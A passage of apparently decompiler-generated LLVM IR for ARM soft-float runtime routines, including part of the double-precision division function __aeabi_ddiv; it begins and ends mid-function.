  store i32 %v9_1cfbc, i32* %ip.global-to-local, align 4
  %v7_1cfc4 = zext i32 %v1_1cfb0 to i64
  %v11_1cfc4 = mul nuw nsw i64 %v7_1cfc4, %tmp
  %v12_1cfc4 = add i64 %v11_1cfc4, %v7_1cfbc
  %v1_1cfc8 = and i32 %v2_1cf9c, -2147483648
  %v10_1cfcc = zext i32 %v1_1cfb4 to i64
  %v11_1cfcc = mul nuw i64 %v10_1cfcc, %arg1
  %v12_1cfcc = add i64 %v12_1cfc4, %v11_1cfcc
  %v13_1cfcc = udiv i64 %v12_1cfcc, 4294967296
  %v15_1cfcc = trunc i64 %v12_1cfcc to i32
  %v10_1cfd4 = mul nuw i64 %v10_1cfcc, %v7_1cfc4
  %v11_1cfd4 = add i64 %v13_1cfcc, %v10_1cfd4
  %v12_1cfd4 = udiv i64 %v11_1cfd4, 4294967296
  %v13_1cfd4 = trunc i64 %v12_1cfd4 to i32
  %v14_1cfd4 = trunc i64 %v11_1cfd4 to i32
  %v2_1cfd8 = icmp eq i32 %v9_1cfbc, 0
  br i1 %v2_1cfd8, label %bb42, label %bb41

bb41:                                             ; preds = %dec_label_pc_1cfbc
  %v2_1cfdc = or i32 %v15_1cfcc, 1
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_1cfbc, %bb41
  %storemerge = phi i32 [ %v2_1cfdc, %bb41 ], [ %v15_1cfcc, %dec_label_pc_1cfbc ]
  %v0_1cff0 = phi i32 [ %v2_1cfdc, %bb41 ], [ %v15_1cfcc, %dec_label_pc_1cfbc ]
  store i32 %storemerge, i32* %lr.global-to-local, align 4
  %v1_1cfe0 = add i32 %v2_1cf98, -255
  %v2_1cfe4 = icmp ugt i32 %v13_1cfd4, 511
  %v2_1cfe8 = icmp eq i1 %v2_1cfe4, false
  %v3_1cfe8 = add i32 %v2_1cf98, -1023
  %v5_1cfe8 = sext i1 %v2_1cfe8 to i32
  %v6_1cfe8 = add i32 %v3_1cfe8, %v5_1cfe8
  store i32 %v6_1cfe8, i32* %r4.global-to-local, align 4
  %v3_1cfec = icmp ugt i32 %v1_1cfe0, 768
  br i1 %v3_1cfec, label %dec_label_pc_1cffc, label %dec_label_pc_1cff0

dec_label_pc_1cff0:                               ; preds = %bb42
  %v1_1cff0 = icmp slt i32 %v0_1cff0, 0
  %v2_1cff0 = mul i32 %v0_1cff0, 2
  store i32 %v2_1cff0, i32* %lr.global-to-local, align 4
  %v3_1cff4 = mul i32 %v14_1cfd4, 2
  %v4_1cff4 = zext i1 %v1_1cff0 to i32
  %v5_1cff4 = or i32 %v4_1cff4, %v3_1cff4
  %v9_1cff4 = icmp ule i32 %v5_1cff4, %v14_1cfd4
  %v10_1cff4 = icmp ult i32 %v3_1cff4, %v14_1cfd4
  %v11_1cff4 = select i1 %v1_1cff0, i1 %v9_1cff4, i1 %v10_1cff4
  %v3_1cff825 = mul nuw nsw i64 %v12_1cfd4, 2
  %v3_1cff8 = trunc i64 %v3_1cff825 to i32
  %v4_1cff8 = zext i1 %v11_1cff4 to i32
  %v5_1cff8 = or i32 %v4_1cff8, %v3_1cff8
  br label %dec_label_pc_1cffc

dec_label_pc_1cffc:                               ; preds = %bb42, %dec_label_pc_1cff0
  %v0_1d00c = phi i32 [ %v0_1cff0, %bb42 ], [ %v2_1cff0, %dec_label_pc_1cff0 ]
  %v0_1d004 = phi i32 [ %v14_1cfd4, %bb42 ], [ %v5_1cff4, %dec_label_pc_1cff0 ]
  %v1_1cffc = phi i32 [ %v13_1cfd4, %bb42 ], [ %v5_1cff8, %dec_label_pc_1cff0 ]
  %v4_1cffc = mul i32 %v1_1cffc, 2048
  %v4_1d000 = udiv i32 %v0_1d004, 2097152
  %v5_1cffc = or i32 %v4_1d000, %v1_1cfc8
  %v5_1d000 = or i32 %v5_1cffc, %v4_1cffc
  store i32 %v5_1d000, i32* %r1.global-to-local, align 4
  %v3_1d004 = mul i32 %v0_1d004, 2048
  %v4_1d008 = udiv i32 %v0_1d00c, 2097152
  %v5_1d008 = or i32 %v3_1d004, %v4_1d008
  store i32 %v5_1d008, i32* %r0.global-to-local, align 4
  %v3_1d00c = mul i32 %v0_1d00c, 2048
  store i32 %v3_1d00c, i32* %lr.global-to-local, align 4
  %v1_1d010 = add i32 %v6_1cfe8, -253
  store i32 %v1_1d010, i32* %ip.global-to-local, align 4
  %v2_1d010 = icmp ugt i32 %v6_1cfe8, 252
  %v7_1d010 = icmp eq i32 %v6_1cfe8, 253
  %v2_1d014 = xor i1 %v7_1d010, true
  %v3_1d014 = and i1 %v2_1d010, %v2_1d014
  br i1 %v3_1d014, label %bb43, label %bb44

bb43:                                             ; preds = %dec_label_pc_1cffc
  %v6_1d014 = icmp ugt i32 %v1_1d010, 1791
  %v11_1d014 = icmp eq i32 %v1_1d010, 1792
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_1cffc, %bb43
  %v1_1d018 = phi i1 [ %v7_1d010, %dec_label_pc_1cffc ], [ %v11_1d014, %bb43 ]
  %v0_1d018 = phi i1 [ %v2_1d010, %dec_label_pc_1cffc ], [ %v6_1d014, %bb43 ]
  %v2_1d018 = xor i1 %v1_1d018, true
  %v3_1d018 = and i1 %v0_1d018, %v2_1d018
  call void @__pseudo_cond_branch(i1 %v3_1d018, i32 ptrtoint (i32* @global_var_1d064.1394 to i32))
  %v0_1d01c = load i32, i32* %lr.global-to-local, align 4
  %v2_1d01c = icmp slt i32 %v0_1d01c, 0
  %v6_1d01c = icmp eq i32 %v0_1d01c, -2147483648
  %v1_1d020 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v6_1d01c, label %bb45, label %._crit_edge

bb45:                                             ; preds = %bb44
  %v2_1d020 = urem i32 %v1_1d020, 2
  %v3_1d020 = icmp ne i32 %v2_1d020, 0
  %v4_1d020 = udiv i32 %v1_1d020, 2
  store i32 %v4_1d020, i32* %lr.global-to-local, align 4
  br label %._crit_edge

._crit_edge:                                      ; preds = %bb44, %bb45
  %v1_1d024 = phi i1 [ %v3_1d020, %bb45 ], [ %v2_1d01c, %bb44 ]
  %v2_1d024 = zext i1 %v1_1d024 to i32
  %v3_1d024 = add i32 %v2_1d024, %v1_1d020
  store i32 %v3_1d024, i32* %r0.global-to-local, align 4
  %v0_1d028 = load i32, i32* %r1.global-to-local, align 4
  %v1_1d028 = load i32, i32* %r4.global-to-local, align 4
  %v2_1d028 = and i32 %v1_1d028, 4096
  %v3_1d028 = icmp ne i32 %v2_1d028, 0
  %v4_1d028 = mul i32 %v1_1d028, 1048576
  %v6_1d028 = add i32 %v4_1d028, %v0_1d028
  %v7_1d028 = zext i1 %v3_1d028 to i32
  %v8_1d028 = add i32 %v7_1d028, %v6_1d028
  store i32 %v8_1d028, i32* %r1.global-to-local, align 4
  %v2_1d02c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1d02c, i32* %r4.global-to-local, align 4
  store i32 %v12_1cf78, i32* %lr.global-to-local, align 4
  ret i32 %v3_1d024

dec_label_pc_1d034:                               ; preds = %.thread3, %bb40
  %v1_1d040 = phi i32 [ %v1_1cfb47, %.thread3 ], [ %v1_1cfb4, %bb40 ]
  %v1_1d038 = phi i32 [ %v1_1cfb05, %.thread3 ], [ %v1_1cfb0, %bb40 ]
  %v1_1d034 = and i32 %v2_1cf9c, -2147483648
  %v2_1d038 = or i32 %v1_1d038, %v1_1d034
  %v4_1d03c1 = or i64 %tmp, %arg1
  %v4_1d03c = trunc i64 %v4_1d03c1 to i32
  store i32 %v4_1d03c, i32* %r0.global-to-local, align 4
  %v2_1d040 = xor i32 %v2_1d038, %v1_1d040
  store i32 %v2_1d040, i32* %r1.global-to-local, align 4
  %v4_1d044 = udiv i32 %v1_1cfa0, 2
  %v5_1d044 = sub i32 %v2_1cf98, %v4_1d044
  store i32 %v5_1d044, i32* %r4.global-to-local, align 4
  %v7_1d044 = sub i32 0, %v5_1d044
  %v8_1d044 = and i32 %v2_1cf98, %v7_1d044
  %v11_1d044 = icmp eq i32 %v2_1cf98, %v4_1d044
  %v7_1d048 = icmp sgt i32 %v2_1cf98, %v4_1d044
  br i1 %v7_1d048, label %bb46, label %bb47

bb46:                                             ; preds = %dec_label_pc_1d034
  %v10_1d048 = sub i32 %v1_1cfa0, %v5_1d044
  %v12_1d048 = xor i32 %v5_1d044, %v1_1cfa0
  %v13_1d048 = xor i32 %v10_1d048, %v1_1cfa0
  %v14_1d048 = and i32 %v13_1d048, %v12_1d048
  %v17_1d048 = icmp eq i32 %v1_1cfa0, %v5_1d044
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_1d034, %bb46
  %v3_1d054.in = phi i32 [ %v8_1d044, %dec_label_pc_1d034 ], [ %v14_1d048, %bb46 ]
  %v2_1d054.in = phi i32 [ %v5_1d044, %dec_label_pc_1d034 ], [ %v10_1d048, %bb46 ]
  %v1_1d054 = phi i1 [ %v11_1d044, %dec_label_pc_1d034 ], [ %v17_1d048, %bb46 ]
  %v2_1d054 = icmp slt i32 %v2_1d054.in, 0
  %v3_1d054 = icmp slt i32 %v3_1d054.in, 0
  %v3_1d04c = xor i1 %v3_1d054, %v2_1d054
  %v4_1d04c = or i1 %v1_1d054, %v3_1d04c
  br i1 %v4_1d04c, label %._crit_edge23, label %bb48

._crit_edge23:                                    ; preds = %bb47
  %v0_1d054.pre = load i32, i32* %lr.global-to-local, align 4
  br label %bb49

bb48:                                             ; preds = %bb47
  %v9_1d04c30 = mul i32 %v5_1d044, 1048576
  %v10_1d04c31 = or i32 %v2_1d040, %v9_1d04c30
  store i32 %v10_1d04c31, i32* %r1.global-to-local, align 4
  %v7_1d050 = load i32, i32* %stack_var_-16, align 4
  store i32 %v7_1d050, i32* %r4.global-to-local, align 4
  store i32 %v12_1cf78, i32* %lr.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %._crit_edge23, %bb48
  %v0_1d054 = phi i32 [ %v0_1d054.pre, %._crit_edge23 ], [ %v12_1cf78, %bb48 ]
  %v6_1d054 = xor i1 %v4_1d04c, true
  call void @__pseudo_cond_branch(i1 %v6_1d054, i32 %v0_1d054)
  %v0_1d058 = load i32, i32* %r1.global-to-local, align 4
  %v1_1d058 = or i32 %v0_1d058, 1048576
  store i32 %v1_1d058, i32* %r1.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v0_1d060 = load i32, i32* %r4.global-to-local, align 4
  %v1_1d060 = add i32 %v0_1d060, -1
  store i32 %v1_1d060, i32* %r4.global-to-local, align 4
  ret i32 %v4_1d03c

; uselistorder directives
  uselistorder i32 %v5_1d044, { 1, 0, 5, 3, 4, 2, 6 }
  uselistorder i32 %v4_1d044, { 2, 1, 0 }
  uselistorder i32 %v1_1d020, { 2, 0, 1 }
  uselistorder i32 %v0_1d01c, { 1, 0 }
  uselistorder i1 %v7_1d010, { 1, 0 }
  uselistorder i32 %v2_1cff0, { 1, 0 }
  uselistorder i1 %v1_1cff0, { 1, 0 }
  uselistorder i32 %v6_1cfe8, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1cff0, { 1, 0, 2 }
  uselistorder i32 %v14_1cfd4, { 1, 3, 2, 0 }
  uselistorder i64 %v11_1cfd4, { 1, 0 }
  uselistorder i64 %v12_1cfcc, { 1, 0 }
  uselistorder i64 %v10_1cfcc, { 1, 0 }
  uselistorder i64 %v7_1cfc4, { 1, 0 }
  uselistorder i64 %v6_1cfbc, { 1, 0 }
  uselistorder i32 %v6_1cfa4, { 1, 0 }
  uselistorder i32 %v6_1cfa0, { 1, 0, 2 }
  uselistorder i32 %v1_1cfa0, { 5, 2, 3, 4, 1, 0 }
  uselistorder i32 %v2_1cf98, { 4, 3, 0, 2, 1, 5, 6 }
  uselistorder i32 %v6_1cf88, { 2, 1, 0 }
  uselistorder i32 %v5_1cf84, { 2, 1, 0 }
  uselistorder i32 %v12_1cf78, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 1, 4, 5, 6, 7, 8, 10, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i32 -255, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %arg4, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 2, 3, 1, 4 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_1d034, { 1, 0 }
  uselistorder label %._crit_edge, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_1cffc, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %.thread2, { 3, 2, 1, 0 }
}

define i32 @function_1d064() local_unnamed_addr {
dec_label_pc_1d064:
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_16 = alloca i32, align 4
  %v0_1d064 = load i1, i1* @cpsr_z, align 1
  %v1_1d064 = load i1, i1* @cpsr_n, align 1
  %v2_1d064 = load i1, i1* @cpsr_v, align 1
  %v3_1d064 = xor i1 %v1_1d064, %v2_1d064
  %v4_1d064 = or i1 %v0_1d064, %v3_1d064
  br i1 %v4_1d064, label %dec_label_pc_1d068, label %dec_label_pc_1d1e0

dec_label_pc_1d068:                               ; preds = %dec_label_pc_1d064
  %v0_1d068 = load i32, i32* @r4, align 4
  %v4_1d068 = add i32 %v0_1d068, 54
  %v6_1d068 = sub i32 0, %v0_1d068
  %v7_1d068 = and i32 %v4_1d068, %v6_1d068
  %v8_1d068 = icmp slt i32 %v7_1d068, 0
  %v9_1d068 = icmp slt i32 %v4_1d068, 0
  %v10_1d068 = icmp eq i32 %v4_1d068, 0
  %v7_1d06c = icmp sgt i32 %v0_1d068, -54
  br i1 %v7_1d06c, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_1d068
  store i32 0, i32* @r0, align 4
  %v8_1d070 = load i32, i32* @r1, align 4
  %v9_1d070 = and i32 %v8_1d070, -2147483648
  store i32 %v9_1d070, i32* @r1, align 4
  store i32 %tmp10, i32* @r4, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1d068, %bb
  %v4_1d078 = xor i1 %v9_1d068, %v8_1d068
  %v5_1d078 = or i1 %v10_1d068, %v4_1d078
  call void @__pseudo_cond_branch(i1 %v5_1d078, i32 %tmp7)
  %v0_1d07c = load i32, i32* @r4, align 4
  %v1_1d07c = sub i32 0, %v0_1d07c
  %v2_1d080 = sub i32 -32, %v0_1d07c
  %v4_1d080 = add i32 %v0_1d07c, 31
  %v5_1d080 = and i32 %v4_1d080, %v1_1d07c
  %v6_1d080 = icmp slt i32 %v5_1d080, 0
  store i1 %v6_1d080, i1* @cpsr_v, align 1
  %v6_1d084 = icmp slt i32 %v1_1d07c, 32
  br i1 %v6_1d084, label %dec_label_pc_1d088, label %dec_label_pc_1d0f4

dec_label_pc_1d088:                               ; preds = %.thread1
  %v1_1d088 = add i32 %v2_1d080, 12
  %v8_1d08c = icmp sgt i32 %v1_1d088, 0
  br i1 %v8_1d08c, label %dec_label_pc_1d0c4, label %dec_label_pc_1d090

dec_label_pc_1d090:                               ; preds = %dec_label_pc_1d088
  %v1_1d090 = add i32 %v2_1d080, 32
  %v1_1d094 = sub i32 0, %v2_1d080
  %v0_1d098 = load i32, i32* @r0, align 4
  %v6_1d098 = shl i32 %v0_1d098, %v1_1d094
  %v2_1d09c = add i32 %v2_1d080, 31
  %v3_1d09c = shl i32 1, %v2_1d09c
  %v6_1d09c = lshr i32 %v0_1d098, %v1_1d090
  %v1_1d0a0 = load i32, i32* @r1, align 4
  %v7_1d0a0 = shl i32 %v1_1d0a0, %v1_1d094
  %v8_1d0a0 = or i32 %v7_1d0a0, %v6_1d09c
  %v1_1d0a4 = and i32 %v1_1d0a0, -2147483648
  %tmp = bitcast i32 %v1_1d0a0 to float
  %tmp19 = call float @fabsf(float %tmp)
  %v1_1d0a8 = bitcast float %tmp19 to i32
  %tmp20 = icmp slt i32 %v6_1d098, 0
  %v4_1d0ac = zext i1 %tmp20 to i32
  %v5_1d0ac = add i32 %v8_1d0a0, %v4_1d0ac
  %v5_1d0b0 = and i32 %v1_1d0a8, %v3_1d09c
  %v6_1d0b0 = icmp ne i32 %v5_1d0b0, 0
  %v7_1d0b0 = lshr i32 %v1_1d0a8, %v1_1d090
  %v9_1d0b0 = add i32 %v7_1d0b0, %v1_1d0a4
  %v10_1d0b0 = zext i1 %v6_1d0b0 to i32
  %v11_1d0b0 = add i32 %v9_1d0b0, %v10_1d0b0
  store i32 %v11_1d0b0, i32* @r1, align 4
  %v19_1d0b0 = add i32 %v11_1d0b0, %v10_1d0b0
  %v20_1d0b0 = xor i32 %v19_1d0b0, %v1_1d0a0
  %v21_1d0b0 = xor i32 %v19_1d0b0, %v7_1d0b0
  %v22_1d0b0 = and i32 %v20_1d0b0, %v21_1d0b0
  %v23_1d0b0 = icmp slt i32 %v22_1d0b0, 0
  store i1 %v23_1d0b0, i1* @cpsr_v, align 1
  %v3_1d0b4 = mul i32 %v6_1d098, 2
  %v4_1d0b4 = or i32 %v3_1d0b4, %tmp7
  %v5_1d0b4 = icmp slt i32 %v4_1d0b4, 0
  store i1 %v5_1d0b4, i1* @cpsr_n, align 1
  %v6_1d0b4 = icmp eq i32 %v4_1d0b4, 0
  store i1 %v6_1d0b4, i1* @cpsr_z, align 1
  br i1 %v6_1d0b4, label %bb13, label %bb14

bb13:                                             ; preds = %dec_label_pc_1d090
  %tmp21 = sext i1 %tmp20 to i32
  %v6_1d0b8 = add nsw i32 %tmp21, -1
  %v7_1d0b8 = and i32 %v5_1d0ac, %v6_1d0b8
  br label %bb14

bb14:                                             ; preds = %dec_label_pc_1d090, %bb13
  %v1_1d0c0 = phi i32 [ %v5_1d0ac, %dec_label_pc_1d090 ], [ %v7_1d0b8, %bb13 ]
  %v2_1d0bc = load i32, i32* %stack_var_16, align 4
  store i32 %v2_1d0bc, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_1d0c0

dec_label_pc_1d0c4:                               ; preds = %dec_label_pc_1d088
  %v1_1d0c4 = sub i32 0, %v2_1d080
  %v1_1d0c8 = add i32 %v2_1d080, 32
  %v0_1d0cc = load i32, i32* @r0, align 4
  %v6_1d0cc = shl i32 %v0_1d0cc, %v1_1d0c4
  %v6_1d0d0 = lshr i32 %v0_1d0cc, %v1_1d0c8
  %v1_1d0d4 = load i32, i32* @r1, align 4
  %v7_1d0d4 = shl i32 %v1_1d0d4, %v1_1d0c4
  %v8_1d0d4 = or i32 %v7_1d0d4, %v6_1d0d0
  %v1_1d0d8 = and i32 %v1_1d0d4, -2147483648
  %tmp22 = icmp slt i32 %v6_1d0cc, 0
  %v4_1d0dc = zext i1 %tmp22 to i32
  %v5_1d0dc = add i32 %v8_1d0d4, %v4_1d0dc
  %v6_1d0dc = icmp ult i32 %v5_1d0dc, %v8_1d0d4
  %v2_1d0e0 = zext i1 %v6_1d0dc to i32
  %v3_1d0e0 = or i32 %v2_1d0e0, %v1_1d0d8
  store i32 %v3_1d0e0, i32* @r1, align 4
  %v9_1d0e0 = add nsw i32 %v3_1d0e0, %v2_1d0e0
  %v10_1d0e0 = sub i32 0, %v1_1d0d4
  %v11_1d0e0 = and i32 %v9_1d0e0, %v10_1d0e0
  %v12_1d0e0 = icmp slt i32 %v11_1d0e0, 0
  store i1 %v12_1d0e0, i1* @cpsr_v, align 1
  %v3_1d0e4 = mul i32 %v6_1d0cc, 2
  %v4_1d0e4 = or i32 %v3_1d0e4, %tmp7
  %v5_1d0e4 = icmp slt i32 %v4_1d0e4, 0
  store i1 %v5_1d0e4, i1* @cpsr_n, align 1
  %v6_1d0e4 = icmp eq i32 %v4_1d0e4, 0
  store i1 %v6_1d0e4, i1* @cpsr_z, align 1
  br i1 %v6_1d0e4, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_1d0c4
  %tmp23 = sext i1 %tmp22 to i32
  %v6_1d0e8 = add nsw i32 %tmp23, -1
  %v7_1d0e8 = and i32 %v5_1d0dc, %v6_1d0e8
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_1d0c4, %bb15
  %v1_1d0f0 = phi i32 [ %v5_1d0dc, %dec_label_pc_1d0c4 ], [ %v7_1d0e8, %bb15 ]
  %v2_1d0ec = load i32, i32* %stack_var_16, align 4
  store i32 %v2_1d0ec, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_1d0f0

dec_label_pc_1d0f4:                               ; preds = %.thread1
  %v1_1d0f4 = sub i32 32, %v2_1d080
  %v1_1d0f8 = load i32, i32* @r0, align 4
  %v7_1d0f8 = shl i32 %v1_1d0f8, %v1_1d0f4
  %v8_1d0f8 = or i32 %v7_1d0f8, %tmp7
  %v6_1d0fc = lshr i32 %v1_1d0f8, %v2_1d080
  %v1_1d100 = load i32, i32* @r1, align 4
  %v7_1d100 = shl i32 %v1_1d100, %v1_1d0f4
  %v8_1d100 = or i32 %v7_1d100, %v6_1d0fc
  %v6_1d104 = lshr i32 %v1_1d100, %v2_1d080
  %v1_1d108 = and i32 %v1_1d100, -2147483648
  store i32 %v1_1d108, i32* @r1, align 4
  %v7_1d10c = lshr i32 %v1_1d108, %v2_1d080
  %v8_1d10c = sub i32 -1, %v7_1d10c
  %v9_1d10c = and i32 %v6_1d104, %v8_1d10c
  %tmp24 = icmp slt i32 %v8_1d100, 0
  %v4_1d110 = zext i1 %tmp24 to i32
  %v5_1d110 = add i32 %v4_1d110, %v9_1d10c
  %v3_1d114 = mul i32 %v8_1d100, 2
  %v4_1d114 = or i32 %v8_1d0f8, %v3_1d114
  %v5_1d114 = icmp slt i32 %v4_1d114, 0
  store i1 %v5_1d114, i1* @cpsr_n, align 1
  %v6_1d114 = icmp eq i32 %v4_1d114, 0
  store i1 %v6_1d114, i1* @cpsr_z, align 1
  br i1 %v6_1d114, label %bb17, label %bb18

bb17:                                             ; preds = %dec_label_pc_1d0f4
  %tmp25 = sext i1 %tmp24 to i32
  %v6_1d118 = add nsw i32 %tmp25, -1
  %v7_1d118 = and i32 %v5_1d110, %v6_1d118
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_1d0f4, %bb17
  %v1_1d120 = phi i32 [ %v5_1d110, %dec_label_pc_1d0f4 ], [ %v7_1d118, %bb17 ]
  %v2_1d11c = load i32, i32* %stack_var_16, align 4
  store i32 %v2_1d11c, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_1d120

dec_label_pc_1d1e0:                               ; preds = %dec_label_pc_1d064
  %v0_1d1e0 = load i32, i32* @r1, align 4
  %v1_1d1e0 = and i32 %v0_1d1e0, -2147483648
  %v1_1d1e8 = or i32 %v1_1d1e0, 2146435072
  store i32 %v1_1d1e8, i32* @r1, align 4
  store i32 %tmp10, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v5_1d110, { 1, 0 }
  uselistorder i32 %v5_1d0dc, { 1, 0, 2 }
  uselistorder i32 %v8_1d0d4, { 1, 0 }
  uselistorder i32 %v1_1d0c4, { 1, 0 }
  uselistorder i32 %v5_1d0ac, { 1, 0 }
  uselistorder i32 %v1_1d0a0, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1d094, { 1, 0 }
  uselistorder i32 %v2_1d080, { 5, 6, 7, 9, 0, 1, 2, 3, 4, 8 }
  uselistorder i32 %v1_1d07c, { 1, 0 }
  uselistorder i32 %v4_1d068, { 1, 2, 0 }
  uselistorder i32 %v0_1d068, { 1, 0, 2 }
  uselistorder i32 %tmp10, { 1, 0 }
  uselistorder i32 %tmp6, { 2, 1, 0 }
  uselistorder i32 %tmp5, { 2, 1, 0 }
  uselistorder i32 12, { 45, 46, 65, 72, 8, 73, 76, 3, 1, 2, 77, 78, 5, 0, 4, 88, 27, 10, 31, 11, 12, 74, 75, 28, 29, 30, 71, 13, 89, 90, 9, 137, 138, 139, 140, 141, 143, 144, 142, 145, 146, 147, 148, 149, 150, 151, 14, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 15, 66, 67, 68, 69, 70, 32, 33, 16, 34, 35, 36, 64, 96, 37, 38, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 6, 79, 80, 81, 82, 83, 17, 84, 18, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 133, 126, 127, 128, 129, 130, 131, 132, 134, 135, 19, 136, 85, 7, 20, 21, 22, 24, 23, 25, 60, 86, 87, 26, 39, 40, 41, 42, 43, 44, 61, 62, 63, 91, 92, 93, 94, 95, 97 }
  uselistorder i32 -32, { 4, 3, 5, 6, 7, 11, 8, 12, 13, 9, 2, 10, 0, 1, 14 }
  uselistorder i32 54, { 3, 0, 1, 4, 2 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_1d1f8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1d1f8:
  %v1_1d1fc = or i32 %arg1, 2146959360
  store i32 %v1_1d1fc, i32* @r1, align 4
  %v1_1d204 = load i32, i32* @r0, align 4
  ret i32 %v1_1d204
}

define i32 @__aeabi_ddiv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1d208 = load i32, i32* @r4, align 4
  store i32 %v3_1d208, i32* %stack_var_-16, align 4
  %v6_1d208 = load i32, i32* @r5, align 4
  %v9_1d208 = load i32, i32* @r6, align 4
  %v12_1d208 = load i32, i32* @lr, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v1_1d214 = load i32, i32* @r1, align 4
  %v4_1d214 = udiv i32 %v1_1d214, 1048576
  %v5_1d214 = urem i32 %v4_1d214, 2048
  store i32 %v5_1d214, i32* @r4, align 4
  %v6_1d214 = icmp eq i32 %v5_1d214, 0
  br i1 %v6_1d214, label %entry..thread2_crit_edge, label %bb

entry..thread2_crit_edge:                         ; preds = %entry
  %.pre147 = udiv i32 %arg4, 1048576
  br label %.thread2

bb:                                               ; preds = %entry
  %v5_1d218 = udiv i32 %arg4, 1048576
  %v6_1d218 = urem i32 %v5_1d218, 2048
  store i32 %v6_1d218, i32* %r5.global-to-local, align 4
  %v7_1d218 = icmp eq i32 %v6_1d218, 0
  br i1 %v7_1d218, label %.thread1, label %bb90

.thread1:                                         ; preds = %bb
  br label %dec_label_pc_1d3a4

bb90:                                             ; preds = %bb
  %v5_1d21c = icmp eq i32 %v5_1d214, 2047
  br i1 %v5_1d21c, label %.thread2, label %bb91

.thread2:                                         ; preds = %entry..thread2_crit_edge, %bb90
  %.pre145.pre-phi = phi i32 [ %.pre147, %entry..thread2_crit_edge ], [ %v5_1d218, %bb90 ]
  br label %dec_label_pc_1d3a4

bb91:                                             ; preds = %bb90
  %v5_1d220 = icmp eq i32 %v6_1d218, 2047
  br i1 %v5_1d220, label %dec_label_pc_1d3a4, label %dec_label_pc_1d228

dec_label_pc_1d228:                               ; preds = %bb91
  %v2_1d228 = sub nsw i32 %v5_1d214, %v6_1d218
  store i32 %v2_1d228, i32* %r4.global-to-local, align 4
  %v2_1d22c = xor i32 %v1_1d214, %arg4
  %v4_1d230 = mul i32 %arg4, 4096
  %v5_1d230 = or i32 %v4_1d230, %arg3
  store i32 %v5_1d230, i32* %r5.global-to-local, align 4
  %v7_1d230 = icmp eq i32 %v5_1d230, 0
  %v3_1d234 = mul i32 %v1_1d214, 4096
  store i32 %v3_1d234, i32* %r1.global-to-local, align 4
  br i1 %v7_1d230, label %dec_label_pc_1d370, label %dec_label_pc_1d23c

dec_label_pc_1d23c:                               ; preds = %dec_label_pc_1d228
  %tmp92 = mul i32 %arg4, 256
  %v4_1d244 = and i32 %tmp92, 268435200
  %v4_1d248 = udiv i32 %arg3, 16777216
  %v5_1d244 = or i32 %v4_1d248, %v4_1d244
  %v5_1d248 = or i32 %v5_1d244, 268435456
  store i32 %v5_1d248, i32* %r3.global-to-local, align 4
  %v3_1d24c = mul i32 %arg3, 256
  store i32 %v3_1d24c, i32* %r2.global-to-local, align 4
  %tmp93 = mul i32 %v1_1d214, 256
  %v4_1d250 = and i32 %tmp93, 268435200
  %v1_1d254 = load i32, i32* @r0, align 4
  %v4_1d254 = udiv i32 %v1_1d254, 16777216
  %v5_1d250 = or i32 %v4_1d250, %v4_1d254
  %v5_1d254 = or i32 %v5_1d250, 268435456
  store i32 %v5_1d254, i32* %r5.global-to-local, align 4
  %v3_1d258 = mul i32 %v1_1d254, 256
  store i32 %v3_1d258, i32* %r6.global-to-local, align 4
